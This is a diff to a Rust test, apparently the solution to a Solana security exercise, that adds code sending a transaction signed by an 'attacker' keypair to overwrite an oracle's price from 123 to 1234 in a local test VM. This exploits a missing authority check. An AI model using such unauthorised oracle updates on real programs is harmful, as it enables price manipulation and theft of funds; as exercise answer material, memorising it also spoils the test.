@@ -53,6 +53,22 @@ fn test() {
     assert_eq!(oracle_state.price, 123);
 
     // Write your code here - send transaction using the attacker's keypair
+    let update_ix = Instruction {
+        program_id,
+        accounts: vec![
+            AccountMeta::new(oracle.pubkey(), false),
+            AccountMeta::new(attacker.pubkey(), true),
+        ],
+        data: borsh::to_vec(&Cmd::Update(1234)).unwrap(),
+    };
+
+     svm.send_transaction(Transaction::new_signed_with_payer(
+        &[update_ix],
+        Some(&attacker.pubkey()),
+        &[&attacker],
+        svm.latest_blockhash(),
+    ))
+    .unwrap();
 
     let data = svm.get_account(&oracle.pubkey()).unwrap().data;
     let oracle_state = Oracle::try_from_slice(&data).unwrap();
